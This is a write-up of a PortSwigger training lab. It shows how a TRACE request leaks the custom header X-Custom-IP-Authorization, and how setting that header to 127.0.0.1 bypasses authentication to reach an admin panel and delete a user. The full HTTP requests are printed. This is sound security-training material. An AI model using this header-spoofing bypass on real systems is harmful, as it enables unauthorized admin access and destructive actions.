# Lab: Authentication bypass via information disclosure

### Instructions

This lab's administration interface has an authentication bypass vulnerability, but it is impractical to exploit without knowledge of a custom HTTP header used by the front-end.

To solve the lab, obtain the header name then use it to bypass the lab's authentication. Access the admin interface and delete the user `carlos`.

You can log in to your own account using the following credentials: `wiener:peter`.

### Solution

Logging into the site and trying out common directories, and `/admin` endpoint is found.

This contains the message:

```
 Admin interface only available to local users 
```

Capturing this request in Burp, we can change the request type from GET to TRACE, which reveals an interesting header:

```
TRACE /admin HTTP/2
Host: 0a7d00a104d7e4858054bc1700f20037.web-security-academy.net
Cookie: session=Sk536igMrT7FyCCUNRaFM29ALI2SzYkN
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

And the response:

```
HTTP/2 200 OK
Content-Type: message/http
X-Frame-Options: SAMEORIGIN
Content-Length: 583

TRACE /admin HTTP/1.1
Host: 0a7d00a104d7e4858054bc1700f20037.web-security-academy.net
user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
accept-language: en-US,en;q=0.5
accept-encoding: gzip, deflate, br
upgrade-insecure-requests: 1
sec-fetch-dest: document
sec-fetch-mode: navigate
sec-fetch-site: none
sec-fetch-user: ?1
priority: u=0, i
te: trailers
cookie: session=Sk536igMrT7FyCCUNRaFM29ALI2SzYkN
Content-Length: 0
X-Custom-IP-Authorization: MY_IP
```

Let's add this custom header and set the ip to localhost, change the request type back to GET and send it.

```
GET /admin HTTP/2
Host: 0a7d00a104d7e4858054bc1700f20037.web-security-academy.net
Cookie: session=Sk536igMrT7FyCCUNRaFM29ALI2SzYkN
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Content-Length: 0
X-Custom-Ip-Authorization: 127.0.0.1
```


Opening the response in the browser we are now in the `/admin` dashboard:

```

Home

|
Admin panel

|
My account
Users
wiener - Delete
carlos - Delete
```

We can delete the user Carlos and solve the lab.

```
GET /admin/delete?username=carlos HTTP/2
Host: 0a7d00a104d7e4858054bc1700f20037.web-security-academy.net
Cookie: session=Sk536igMrT7FyCCUNRaFM29ALI2SzYkN
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a7d00a104d7e4858054bc1700f20037.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
X-Custom-Ip-Authorization: 127.0.0.1
```

### Python Solution

See `info_disclosure_04.py`.

```
┌──(ryan㉿kali)-[~/PortSwigger_Labs/Information_Disclosure/Info_Disclosure_04_authentication_bypass_via_info_disclosure]
└─$ python info_disclosure_04.py https://0a59002f03ab27ff81ddf264006d00f9.web-security-academy.net/
[+] Deleted Carlos... Lab solved
```